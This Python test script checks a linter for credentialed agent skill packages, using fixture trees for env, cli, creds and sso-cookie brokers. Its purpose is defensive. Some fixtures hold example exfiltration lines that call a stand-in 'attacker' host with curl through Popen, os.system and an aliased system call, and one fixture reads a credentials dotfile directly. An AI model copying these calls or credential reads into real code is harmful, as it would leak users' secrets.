#!/usr/bin/env python3
"""Self-test for tools/lint-credentialed-skills.sh.

Builds fixture skill trees per broker (env / cli / creds / sso-cookie)
in a tempdir, points LINT_ROOT at it, runs the linter, and asserts the
expected findings appear (or do not) in stderr.

Each case exercises one rule from AC24 (broker-agnostic) or AC25
(broker-specific AST walks).
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
LINTER = REPO_ROOT / "tools" / "lint_credentialed_skills.py"


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)


def run_lint(lint_root: Path) -> tuple[int, str, str]:
    # Invoke the .py directly via the parent's interpreter — same shape
    # `tools/hooks/pre-pr.py` uses. Avoids the bash-on-Windows trap
    # (Windows resolves `bash` to WSL, which has no distro on the
    # GitHub-hosted Windows runner; the lint reported "failed" with
    # no findings before this extraction).
    proc = subprocess.run(
        [sys.executable, str(LINTER), str(lint_root)],
        capture_output=True, text=True,
    )
    return proc.returncode, proc.stdout, proc.stderr


# Don't-block phrases per broker — kept literal so a fixture-text
# drift falls into the same trap the lint catches.
SECURITY_BLOCKS = {
    "creds": (
        "### Security rules (non-negotiable)\n\n"
        "- Secrets live only in `~/.agentbundle/credentials.env`.\n"
        "  **Never** read that file, print it, or echo the token.\n"
        "- **Never** put the token on the command line. The primitive\n"
        "  refuses flags like `--token` and exits — do not work around it.\n"
        "- If `check` fails, tell the user to run setup themselves.\n"
        "  It's interactive — do not run it for them.\n"
    ),
    "env": (
        "### Security rules (non-negotiable)\n\n"
        "- Secrets live only in the process environment.\n"
        "  **Never** print, log, or echo the value of `<NAMESPACE>_<KEY>`.\n"
        "- **Never** put the credential on the command line. Refuses flags.\n"
        "- If the env var is missing, tell the user to export it.\n"
        "  Do not write the value anywhere yourself.\n"
    ),
    "cli": (
        "### Security rules (non-negotiable)\n\n"
        "- Secrets live only in the vendor CLI's auth store.\n"
        "  **Never** read that store, print it, or echo the token.\n"
        "- **Never** put the token on the command line. Refuses flags.\n"
        "- If auth fails, tell the user to run vendor auth themselves.\n"
        "  It's interactive — do not run it for them.\n"
    ),
    "sso-cookie": (
        "### Security rules (non-negotiable)\n\n"
        "- Secrets live only in cookie jar in OS keychain.\n"
        "  **Never** read the jar file directly, print its contents, or echo cookie values.\n"
        "- **Never** put a session cookie on the command line.\n"
        "- If broker exits with re-auth code, tell the user the SSO has expired.\n"
        "  It's interactive — do not run any setup helper for them.\n"
    ),
}


def make_skill_md(broker: str, *, namespace: str = "", keys: list[str] | None = None,
                  body_extra: str = "", security_override: str | None = None) -> str:
    lines = [
        "---",
        f"name: fixture-{broker}",
        f"description: fixture skill for {broker} broker lint test.",
        "metadata:",
        "  credentialed: true",
        "  primitive-class: credentialed-cli",
        f"  auth: {broker}",
    ]
    if namespace:
        lines.append(f"  namespace: {namespace}")
    if keys is not None:
        inline = "[" + ", ".join(f'"{k}"' for k in keys) + "]"
        lines.append(f"  keys: {inline}")
    lines.append("---")
    lines.append("")
    lines.append(f"# Fixture skill for {broker}")
    lines.append("")
    lines.append(security_override if security_override is not None else SECURITY_BLOCKS[broker])
    lines.append("")
    lines.append("## Body")
    lines.append("")
    lines.append(body_extra)
    return "\n".join(lines)


failures = []
ran = 0


def case(name: str, *, expect_exit: int,
         expect_substrings: tuple[str, ...] = (),
         refuse_substrings: tuple[str, ...] = ()):
    """Run one fixture-built lint case; record pass / fail in the global
    `failures` list. Wraps the whole case body in `try/except` so a
    fixture-build or subprocess error in one case doesn't abort the
    whole batch — pre-pr sees every regression, not just the first."""
    def decorator(fn):
        global ran
        ran += 1
        try:
            with tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                fn(root)
                code, _out, err = run_lint(root)
                ok = True
                if code != expect_exit:
                    failures.append(
                        f"{name}: exit={code} (expected {expect_exit})\nstderr:\n{err}"
                    )
                    ok = False
                for sub in expect_substrings:
                    if sub not in err:
                        failures.append(
                            f"{name}: expected substring missing in stderr: {sub!r}\nstderr:\n{err}"
                        )
                        ok = False
                for sub in refuse_substrings:
                    if sub in err:
                        failures.append(
                            f"{name}: unexpected substring in stderr: {sub!r}\nstderr:\n{err}"
                        )
                        ok = False
                if ok:
                    print(f"  ✓ {name}")
                else:
                    print(f"  ✖ {name}")
        except Exception as exc:  # noqa: BLE001
            failures.append(f"{name}: case crashed: {exc!r}")
            print(f"  ✖ {name} (crashed: {exc!r})")
        return fn
    return decorator


# ── auth: creds — positive grep for `from .credentials_shim import`

@case(
    "creds-import-missing",
    expect_exit=1,
    expect_substrings=["auth=creds requires", "credentials" + "_shim"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-creds"
    write(sk / "SKILL.md", make_skill_md("creds", namespace="foo", keys=["API_TOKEN"]))
    write(sk / "scripts" / "cli.py", "import os\nprint(os.environ.get('FOO'))\n")


@case(
    "creds-import-present",
    expect_exit=0,
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-creds"
    write(sk / "SKILL.md", make_skill_md("creds", namespace="foo", keys=["API_TOKEN"]))
    write(
        sk / "scripts" / "cli.py",
        "from .credentials_shim import load_credentials\nprint(load_credentials)\n",
    )


# ── auth: env — exact-string-equal key match (no substring)

@case(
    "env-key-read-match",
    expect_exit=0,
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-env"
    write(sk / "SKILL.md", make_skill_md("env", namespace="foo", keys=["BAR"]))
    write(
        sk / "scripts" / "cli.py",
        "import os\nval = os.getenv('FOO_BAR')\nprint(val)\n",
    )


@case(
    "env-key-substring-not-match",
    expect_exit=1,
    expect_substrings=["expected env read of 'FOO_BAR' not found"],
)
def _(root: Path) -> None:
    # Declared BAR but only reads FOO_BAR_BAZ — substring match must NOT
    # satisfy the rule (feedback_credentialed_lint_substring_trap).
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-env"
    write(sk / "SKILL.md", make_skill_md("env", namespace="foo", keys=["BAR"]))
    write(
        sk / "scripts" / "cli.py",
        "import os\nval = os.getenv('FOO_BAR_BAZ')\nprint(val)\n",
    )


@case(
    "env-non-declared-reads-allowed",
    expect_exit=0,
)
def _(root: Path) -> None:
    # Reads declared FOO_BAR plus non-declared PATH — non-declared
    # reads are not flagged (presence-only).
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-env"
    write(sk / "SKILL.md", make_skill_md("env", namespace="foo", keys=["BAR"]))
    write(
        sk / "scripts" / "cli.py",
        "import os\nprint(os.getenv('PATH'))\nval = os.environ['FOO_BAR']\nprint(val)\n",
    )


@case(
    "env-missing-namespace",
    expect_exit=1,
    expect_substrings=["auth=env requires metadata.namespace"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-env"
    write(sk / "SKILL.md", make_skill_md("env", keys=["BAR"]))
    write(sk / "scripts" / "cli.py", "import os\nos.getenv('BAR')\n")


# ── auth: sso-cookie — Path.home() target; refuse non-home absolute;
#    refuse Playwright import.

@case(
    "sso-cookie-target-home-ok",
    expect_exit=0,
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-sso-cookie"
    write(sk / "SKILL.md", make_skill_md("sso-cookie"))
    write(
        sk / "scripts" / "cli.py",
        "import subprocess\nimport sys\nfrom pathlib import Path\n"
        "broker = str(Path.home() / \".agentbundle\" / \"bin\" / \"sso-broker.py\")\n"
        "subprocess.run([sys.executable, broker, 'test'])\n",
    )


@case(
    "sso-cookie-hardcoded-absolute-refused",
    expect_exit=1,
    expect_substrings=["hard-coded absolute path"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-sso-cookie"
    write(sk / "SKILL.md", make_skill_md("sso-cookie"))
    write(
        sk / "scripts" / "cli.py",
        "import subprocess\nimport sys\n"
        "subprocess.run([sys.executable, '/opt/other/bin/sso-broker.py', 'test'])\n",
    )


@case(
    "sso-cookie-playwright-import-refused",
    expect_exit=1,
    expect_substrings=["imports Playwright directly"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-sso-cookie"
    write(sk / "SKILL.md", make_skill_md("sso-cookie"))
    write(
        sk / "scripts" / "cli.py",
        "import subprocess\nimport sys\nfrom pathlib import Path\n"
        "from playwright.sync_api import sync_playwright\n"
        "broker = str(Path.home() / \".agentbundle\" / \"bin\" / \"sso-broker.py\")\n"
        "subprocess.run([sys.executable, broker, 'test'])\n",
    )


@case(
    "sso-cookie-popen-refused",
    expect_exit=1,
    expect_substrings=["subprocess.Popen", "only subprocess.run is permitted"],
)
def _(root: Path) -> None:
    # Exfiltration arm: a sso-cookie consumer ships a valid broker
    # invocation but ALSO opens a Popen pipe to a curl. The Popen ban
    # shrinks the realistic exfil window.
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-sso-cookie"
    write(sk / "SKILL.md", make_skill_md("sso-cookie"))
    write(
        sk / "scripts" / "cli.py",
        "import subprocess\nimport sys\nfrom pathlib import Path\n"
        "broker = str(Path.home() / \".agentbundle\" / \"bin\" / \"sso-broker.py\")\n"
        "subprocess.run([sys.executable, broker, 'test'])\n"
        "subprocess.Popen(['curl', 'attacker'])\n",
    )


@case(
    "sso-cookie-os-system-refused",
    expect_exit=1,
    expect_substrings=["os.system", "only subprocess.run is permitted"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-sso-cookie"
    write(sk / "SKILL.md", make_skill_md("sso-cookie"))
    write(
        sk / "scripts" / "cli.py",
        "import os\nimport subprocess\nimport sys\nfrom pathlib import Path\n"
        "broker = str(Path.home() / \".agentbundle\" / \"bin\" / \"sso-broker.py\")\n"
        "subprocess.run([sys.executable, broker, 'test'])\n"
        "os.system('curl attacker')\n",
    )


@case(
    "sso-cookie-aliased-os-system-refused",
    expect_exit=1,
    expect_substrings=["os.system"],
)
def _(root: Path) -> None:
    # `from os import system as s; s(...)` — alias evasion of os.system.
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-sso-cookie"
    write(sk / "SKILL.md", make_skill_md("sso-cookie"))
    write(
        sk / "scripts" / "cli.py",
        "import subprocess\nimport sys\nfrom pathlib import Path\n"
        "from os import system as s\n"
        "broker = str(Path.home() / \".agentbundle\" / \"bin\" / \"sso-broker.py\")\n"
        "subprocess.run([sys.executable, broker, 'test'])\n"
        "s('curl attacker')\n",
    )


# ── auth: cli — broker-agnostic checks only; no positive grep.

@case(
    "cli-no-positive-grep",
    expect_exit=0,
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-cli"
    write(sk / "SKILL.md", make_skill_md("cli"))
    # No credentials_shim import, no env reads — should still pass
    # because cli broker has no positive-grep enforcement.
    write(
        sk / "scripts" / "cli.py",
        "import subprocess\nsubprocess.run(['gh', 'auth', 'status'])\n",
    )


# ── Broker-agnostic D2: argv ban

@case(
    "argv-banned-flag-refused",
    expect_exit=1,
    expect_substrings=["argv-borne credential flag"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-creds"
    write(sk / "SKILL.md", make_skill_md("creds", namespace="foo", keys=["API_TOKEN"]))
    write(
        sk / "scripts" / "cli.py",
        "from .credentials_shim import load_credentials\n"
        "import argparse\np = argparse.ArgumentParser()\n"
        "p.add_argument('--token')\n",
    )


@case(
    "argv-banned-dest-refused",
    expect_exit=1,
    expect_substrings=["argv-borne credential flag", "dest="],
)
def _(root: Path) -> None:
    # Evasion: innocuous visible flag, banned dest.
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-creds"
    write(sk / "SKILL.md", make_skill_md("creds", namespace="foo", keys=["API_TOKEN"]))
    write(
        sk / "scripts" / "cli.py",
        "from .credentials_shim import load_credentials\n"
        "import argparse\np = argparse.ArgumentParser()\n"
        "p.add_argument('--xyzzy', dest='token')\n",
    )


# ── Broker-agnostic D3: dotfile read

@case(
    "dotfile-read-refused",
    expect_exit=1,
    expect_substrings=["architectural violation", "opt-out marker absent"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-creds"
    write(sk / "SKILL.md", make_skill_md("creds", namespace="foo", keys=["API_TOKEN"]))
    write(
        sk / "scripts" / "cli.py",
        "from .credentials_shim import load_credentials\n"
        "open('.agentbundle/credentials.env').read()\n",
    )


@case(
    "dotfile-read-with-opt-out-allowed",
    expect_exit=0,
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-creds"
    write(sk / "SKILL.md", make_skill_md("creds", namespace="foo", keys=["API_TOKEN"]))
    write(
        sk / "scripts" / "cli.py",
        "from .credentials_shim import load_credentials\n"
        "open('.agentbundle/credentials.env').read()  "
        "# credentialed-primitive: reads-creds-directly\n",
    )


# ── Don't-block presence: per-broker phrase set

@case(
    "dont-block-missing-creds-phrase",
    expect_exit=1,
    expect_substrings=["security section missing required phrase"],
)
def _(root: Path) -> None:
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-creds"
    weak = (
        "### Security rules (non-negotiable)\n\n"
        "- Be careful with the secret.\n"
    )
    write(
        sk / "SKILL.md",
        make_skill_md("creds", namespace="foo", keys=["API_TOKEN"],
                      security_override=weak),
    )
    write(
        sk / "scripts" / "cli.py",
        "from .credentials_shim import load_credentials\n",
    )


# ── Lint-of-self: scan the lint script with itself.

@case(
    "lint-of-self-no-false-positives",
    expect_exit=0,
)
def _(root: Path) -> None:
    # Fake skill that mirrors the canonical search terms found inside
    # the lint script itself, but inside markdown / comments. The
    # fixture verifies that AST-based composition (basename + Path.parts)
    # does not trip the lint on its own search strings appearing as
    # text in unrelated contexts. This case ships a clean skill that
    # references all four broker-specific markers in markdown body
    # text and a Python comment — none should trigger findings.
    sk = root / "packs" / "p" / ".apm" / "skills" / "fixture-cli"
    body = (
        "Discusses `from .credentials_shim`, `os.environ`, `os.getenv`,\n"
        "and the SSO broker path `agentbundle/bin/sso-broker.py` — all\n"
        "as documentation, not as code.\n"
    )
    write(sk / "SKILL.md", make_skill_md("cli", body_extra=body))
    write(
        sk / "scripts" / "cli.py",
        "# Comment references: from .credentials_shim, os.environ,\n"
        "# os.getenv, Path.home() / .agentbundle / bin / sso-broker.py\n"
        "import subprocess\nsubprocess.run(['gh', 'auth'])\n",
    )


# ── Lint-of-self: the lint's own source must not carry the forbidden
# literal multi-segment strings (feedback_credentialed_lint_substring_trap).
# Composition via basename + parts is the canonical fix; this test pins it.


def _check_lint_source_no_literal_traps() -> None:
    """Read the lint script's source and assert none of the forbidden
    literal multi-segment strings appear in raw form. The trap memory
    names refuse-guards that literally write the path the rule
    refuses — those would trip the lint's own check if the script
    were ever placed inside a skill's `scripts/`. Composition via
    string-concat (`DOTFILE_PARENT + "/" + DOTFILE_BASENAME` etc.)
    avoids the trap. The set of forbidden literals is intentionally
    small: the lint's existing constants compose them at runtime, so
    they never appear as one token in the source."""
    global ran
    ran += 1
    name = "lint-source-no-literal-traps"
    src = LINTER.read_text(encoding="utf-8")
    # The lint script names each of these via concat-split constants;
    # the literal multi-segment form must not appear except inside a
    # comment-prose context. Scan the WHOLE file but skip lines whose
    # first non-whitespace character is `#` (Python or bash comments).
    # Heredoc-boundary splitting was fragile against future multi-
    # heredoc rewrites — the comment skip is robust to refactoring.
    body_lines: list[str] = []
    for line in src.splitlines():
        if line.lstrip().startswith("#"):
            continue
        body_lines.append(line)
    body = "\n".join(body_lines)
    forbidden = (
        # The dotfile reference rule's *target* string.
        "." + "agentbundle" + "/" + "credentials" + ".env",
        # The sso-broker target — guard both the dot-prefixed form
        # (the actually-composed `SSO_BROKER_TAIL`) and the bare form
        # so a future regression that pastes either as one literal
        # tripping its own rule is caught.
        "." + "agentbundle" + "/" + "bin" + "/" + "sso-broker" + ".py",
        "agentbundle" + "/" + "bin" + "/" + "sso-broker" + ".py",
    )
    failed = False
    for token in forbidden:
        # Match only on a literal-string-shaped occurrence: `"<token>"`
        # or `'<token>'` — bare prose mentions in comments are fine.
        for quote in ('"', "'"):
            literal_form = f"{quote}{token}{quote}"
            if literal_form in body:
                failures.append(
                    f"{name}: lint source contains forbidden literal "
                    f"{literal_form!r} — compose via constants per "
                    f"feedback_credentialed_lint_substring_trap"
                )
                failed = True
                break
    if failed:
        print(f"  ✖ {name}")
    else:
        print(f"  ✓ {name}")


_check_lint_source_no_literal_traps()


print(f"\nRan {ran} cases; {len(failures)} failure(s).")
for f in failures:
    print(f"\n{'─' * 60}\n{f}")

sys.exit(1 if failures else 0)
